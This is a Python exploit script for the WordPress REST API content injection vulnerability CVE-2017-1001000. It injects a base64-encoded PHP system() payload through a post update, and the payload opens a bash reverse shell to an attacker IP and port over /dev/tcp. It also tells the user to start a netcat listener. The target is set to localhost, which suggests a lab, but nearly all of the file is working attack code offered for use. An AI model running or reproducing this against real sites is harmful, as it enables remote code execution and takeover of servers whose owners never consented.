import requests
import base64

def exploit(target_url, post_id_to_update, attacker_ip, attacker_port):
    """
    Exploits WP Content Injection (CVE-2017-1001000) to get RCE.
    This final version uses a correctly formatted PHP payload to ensure
    execution via eval() and a bash-only reverse shell for portability.
    """

    exploit_url = f"{target_url}/wp-json/wp/v2/posts/{post_id_to_update}"

    raw_payload = f"system(\"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1\");"

    encoded_payload = base64.b64encode(raw_payload.encode('utf-8')).decode('utf-8')

    post_content = f"[vulnerable_shortcode]{encoded_payload}[/vulnerable_shortcode]"

    data = {
        "title": "Final Exploit Payload",
        "content": post_content
    }

    params = {
        "id": f"{post_id_to_update}RCE"
    }

    headers = {
        "Content-Type": "application/json"
    }

    print("[*] Preparing to inject the FINAL payload...")
    print(f"[*] Target URL: {exploit_url}")
    print(f"[*] Attacker: {attacker_ip}:{attacker_port}")
    print(f"[*] PHP Payload (raw): {raw_payload}")
    print(f"[*] Payload (base64): {encoded_payload}")

    try:
        response = requests.post(exploit_url, headers=headers, params=params, json=data, timeout=10)

        if response.status_code == 200:
            print("\n[+] Success! Malicious shortcode injected.")
            post_link = response.json().get('link')
            print(f"[+] Post updated. Visit the link to trigger the shell: {post_link}")
            print(f"[+] Remember to start your listener: nc -lvnp {attacker_port}")
        else:
            print(f"\n[-] Exploit failed. Status: {response.status_code}")
            print(f"[-] Response: {response.text}")

    except requests.exceptions.RequestException as e:
        print(f"\n[-] An error occurred: {e}")

if __name__ == "__main__":
    target = "http://localhost:8081"
    post_id = 1
    ip = "192.168.1.21"  # adjust as needed
    port = 4444

    exploit(target, post_id, ip, port)
